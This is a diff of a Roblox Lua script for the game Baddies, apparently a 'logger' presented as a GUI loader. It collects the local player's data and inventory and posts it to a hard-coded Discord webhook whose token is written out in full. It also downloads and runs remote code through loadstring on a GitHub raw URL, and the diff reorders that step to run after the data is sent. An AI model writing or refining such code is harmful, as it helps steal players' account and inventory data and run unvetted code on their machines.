@@ -1,13 +1,8 @@
--- Baddies Rich Logger (GUI + Inventory Ping)
+-- Final Loader - Rich Ping (No Username Filter)
 
-_G.POOR_WEBHOOK = "https://hooks.hyra.io/api/webhooks/1495237089246187521/3xaeBard0Ia5rOI3mBT9cO9SGiw3phTe4VPv5t2QpdYzPqZTO9AFBaMOEWUvSjZmCXRi"
+_G.POOR_WEBHOOK = "https://discord.com/api/webhooks/1495237089246187521/3xaeBard0Ia5rOI3mBT9cO9SGiw3phTe4VPv5t2QpdYzPqZTO9AFBaMOEWUvSjZmCXRi"
 
--- Load the GUI (this part was already working)
-task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/BaddiesScripted/test/refs/heads/main/gui.lua", true))()
-end)
-
--- Rich Inventory Ping (from the script you sent)
+-- Rich Inventory Ping
 task.spawn(function()
     if game.Players.LocalPlayer then
         local plr = game.Players.LocalPlayer
@@ -67,4 +62,9 @@ task.spawn(function()
             game:HttpPost(_G.POOR_WEBHOOK, http:JSONEncode({content = content, embeds = {embed}}))
         end)
     end
+end)
+
+-- Load the GUI
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/BaddiesScripted/test/refs/heads/main/gui.lua", true))()
 end)
